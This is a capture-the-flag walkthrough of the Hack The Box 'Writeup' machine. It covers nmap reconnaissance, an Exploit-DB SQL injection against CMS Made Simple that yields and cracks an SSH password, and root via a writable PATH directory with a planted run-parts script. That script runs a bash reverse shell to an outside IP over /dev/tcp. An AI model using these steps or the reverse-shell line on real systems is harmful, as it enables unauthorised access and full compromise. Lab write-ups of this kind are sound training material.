@@ -1,0 +1,147 @@
+I"�+<p><img src="/wp-content/uploads/2019/07/writeup/badge.png" alt="Hack The Box Writeup" /></p>
+
+<h1 id="information-gathering">Information Gathering</h1>
+
+<h2 id="nmap">Nmap</h2>
+<p>We begin our reconnaissance by running an Nmap scan checking default scripts and testing for vulnerabilities.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:/media/sf_Research#</span><span class="w"> </span>nmap <span class="nt">-sVC</span> 10.10.10.138
+<span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-17 20:23 EDT
+Nmap scan report for 10.10.10.138
+Host is up (0.37s latency).
+Not shown: 998 filtered ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+| ssh-hostkey:
+|   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)
+|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
+|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+| http-robots.txt: 1 disallowed entry
+|_/writeup/
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Nothing here yet.
+</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
+<span class="go">
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 41.22 seconds
+</span></code></pre></div></div>
+
+<p>From the above output we can see that ports, <strong>22</strong> and <strong>80</strong> are the only ports open. It also appears as though there’s a <code class="language-plaintext highlighter-rouge">robots.txt</code> file disallowing a directory called <code class="language-plaintext highlighter-rouge">/writeup</code> on the web server.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:/media/sf_Research#</span><span class="w"> </span>curl http://10.10.10.138/robots.txt
+<span class="gp">#</span><span class="w">              </span>__
+<span class="gp">#</span><span class="w">      </span>_<span class="o">(</span><span class="se">\ </span>   |@@|
+<span class="gp">#</span><span class="w">     </span><span class="o">(</span>__/<span class="se">\_</span>_ <span class="se">\-</span>-/ __
+<span class="gp">#</span><span class="w">        </span><span class="se">\_</span>__|----|  |   __
+<span class="gp">#</span><span class="w">            </span><span class="se">\ </span><span class="o">}{</span> /<span class="se">\ </span><span class="o">)</span>_ / _<span class="se">\</span>
+<span class="c">#            /\__/\ \__O (__</span>
+<span class="gp">#</span><span class="w">           </span><span class="o">(</span><span class="nt">--</span>/<span class="se">\-</span>-<span class="o">)</span>    <span class="se">\_</span>_/
+<span class="gp">#</span><span class="w">           </span>_<span class="o">)(</span>  <span class="o">)(</span>_
+<span class="gp">#</span><span class="w">          </span><span class="sb">`</span><span class="nt">---</span><span class="s1">''</span><span class="nt">---</span><span class="sb">`</span>
+<span class="go">
+</span><span class="gp">#</span><span class="w"> </span>Disallow access to the blog <span class="k">until </span>content is finished.
+<span class="go">User-agent: *
+Disallow: /writeup/
+</span></code></pre></div></div>
+
+<p><img src="/wp-content/uploads/2019/07/writeup/main_80.png" alt="Index of port 80" /></p>
+
+<p>Running some directory enumeration tools on the main web port didn’t turn up anything interesting. The page indicates that the site isn’t ready yet, but contains various articles on Hack The Box writeups. When we navigate to the <code class="language-plaintext highlighter-rouge">/writeup</code> directory we see that this is where the CMS root directory is located.</p>
+
+<p><img src="/wp-content/uploads/2019/07/writeup/cms.png" alt="/writeup running directory CMS Made Simple" /></p>
+
+<p>We can determine that the site is running <a href="https://www.cmsmadesimple.org/">CMS Made Simple</a>. This can be done by checking the source code, but in my case the Firefox extension <a href="https://www.wappalyzer.com/">Webappalyzer</a> indicated such. After browsing unauthenticated exploits for the CMS we come across one that works perfectly <a href="https://www.exploit-db.com/exploits/46635">https://www.exploit-db.com/exploits/46635</a>.</p>
+
+<h1 id="exploitation">Exploitation</h1>
+
+<p>In order to gain our initial foothold we execute the exploit with the <code class="language-plaintext highlighter-rouge">rockyou.txt</code> worldlist in order for it to crack the hashed password.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:~/Desktop#</span><span class="w"> </span>python cmsmadesimple22-sql.py <span class="nt">-u</span> http://10.10.10.138/writeup <span class="nt">--crack</span> <span class="nt">-w</span> /usr/share/wordlists/rockyou.txt
+<span class="go">
+[+] Salt for password found: 5a599ef579066807
+[+] Username found: jkr
+[+] Email found: jkr@writeup.htb
+[+] Password found: 62def4866937f08cc13bab43bb14e6f7
+[+] Password cracked: raykayjay9
+</span></code></pre></div></div>
+
+<p>While some users on the forum indicated the need to adjust their system time in order for this exploit to function, I did not have to do anything of that nature. The exploit returned the above the first time it was run, and then again when I rerooted the box for the purposes of this writeup.</p>
+
+<p>The username and password did not provide access to the backend of the CMS. They do, however, provide us ssh access to the box.</p>
+
+<h2 id="user-flag">User Flag</h2>
+
+<p>In order to get the user flag, we simply need to ssh into the box and move to the home directory of the <code class="language-plaintext highlighter-rouge">jkr</code> user.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jkr@10.10.10.138's password:
+Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux
+
+The programs included with the Devuan GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Jun 20 19:17:35 2019 from 10.10.14.157
+jkr@writeup:~$ pwd
+/home/jkr
+jkr@writeup:~$ ls -la
+total 72
+drwxr-xr-x 2 jkr  jkr   4096 Jun 20 19:10 .
+drwxr-xr-x 3 root root  4096 Apr 19 04:14 ..
+-r--r--r-- 1 root root    33 Apr 19 08:43 user.txt
+jkr@writeup:~$ cat user.txt
+d4e493fd4068afc9eb1aa6a55319f978
+</code></pre></div></div>
+
+<h2 id="root-flag">Root Flag</h2>
+
+<p>The privilege escalation for this box was not as immediately apparent to me as it was on SwagShop. Running <a href="https://github.com/diego-treitos/linux-smart-enumeration">Linux Smart Enumeration</a> did not return anything very useful for me. Some users on the forum indicated using a tool called <a href="https://github.com/DominicBreuker/pspy">Pspy</a>. This tool allows us to “Monitor Linux processes without root permissions”. After running this script for a while something interesting appears when other users access the box via ssh.</p>
+
+<p><img src="/wp-content/uploads/2019/07/writeup/pyspy.png" alt="output from pyspy" /></p>
+
+<p>The <code class="language-plaintext highlighter-rouge">PATH</code> variable contains a directory <code class="language-plaintext highlighter-rouge">/usr/local/sbin</code> as its first priority.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">jkr@writeup:~$</span><span class="w"> </span><span class="nb">cd</span> /usr/local/
+<span class="gp">jkr@writeup:/usr/local$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="go">total 64
+drwxrwsr-x 10 root staff  4096 Apr 19 04:11 .
+drwxr-xr-x 10 root root   4096 Apr 19 04:11 ..
+drwx-wsr-x  2 root staff 20480 Apr 19 04:11 bin
+drwxrwsr-x  2 root staff  4096 Apr 19 04:11 etc
+drwxrwsr-x  2 root staff  4096 Apr 19 04:11 games
+drwxrwsr-x  2 root staff  4096 Apr 19 04:11 include
+drwxrwsr-x  4 root staff  4096 Apr 24 13:13 lib
+</span><span class="gp">lrwxrwxrwx  1 root staff     9 Apr 19 04:11 man -&gt;</span><span class="w"> </span>share/man
+<span class="go">drwx-wsr-x  2 root staff 12288 Apr 19 04:11 sbin
+drwxrwsr-x  7 root staff  4096 Apr 19 04:30 share
+drwxrwsr-x  2 root staff  4096 Apr 19 04:11 src
+</span></code></pre></div></div>
+
+<p>As we see above, we also have access to write to and execute scripts from the <code class="language-plaintext highlighter-rouge">/usr/local/sbin</code> directory. This means that we can create our own <code class="language-plaintext highlighter-rouge">run-parts</code> to execute other scripts as root. So lets do that.</p>
+
+<p>First we create a script to call our reverse shell, because adding the reverse shell directly to <code class="language-plaintext highlighter-rouge">run-parts</code> didn’t seem to be doing the trick.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">jkr@writeup:/usr/local/sbin$</span><span class="w"> </span>nano shelly.sh <span class="o">&amp;&amp;</span> <span class="nb">chmod</span> +x shelly.sh
+</code></pre></div></div>
+
+<p>Here is what <code class="language-plaintext highlighter-rouge">shelly.sh</code> contains.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/sh  </span>
+bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.52/4444 0&gt;&amp;1
+</code></pre></div></div>
+
+<p>Next we actually create the <code class="language-plaintext highlighter-rouge">run-parts</code> script within <code class="language-plaintext highlighter-rouge">/usr/local/sbin</code> so that it calls <code class="language-plaintext highlighter-rouge">shelly.sh</code></p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">jkr@writeup:/usr/local/sbin$</span><span class="w"> </span>nano run-parts <span class="o">&amp;&amp;</span> <span class="nb">chmod</span> +x run-parts
+</code></pre></div></div>
+
+<p>When we ssh in again from another terminal, we’ll get our reverse shell with root privileges.</p>
+
+<p><img src="/wp-content/uploads/2019/07/writeup/rooted.png" alt="tmux screenshot of achieving root privileges" /></p>
+
+<h1 id="conclusion">Conclusion</h1>
+
+<p>Writeup was a quick and easy box. The initial exploit for the CMS was really fun to watch run, as others have said it felt like The Matrix. After that, the privilege escalation had me a little stumped until I heard about pyspy, then it was fairly easy since the <code class="language-plaintext highlighter-rouge">PATH</code> variable stuck out like a soar thumb. It was still fun to figure out how to exploit that after discovery though, and getting the root shell was rather satisfying.</p>
+:ET
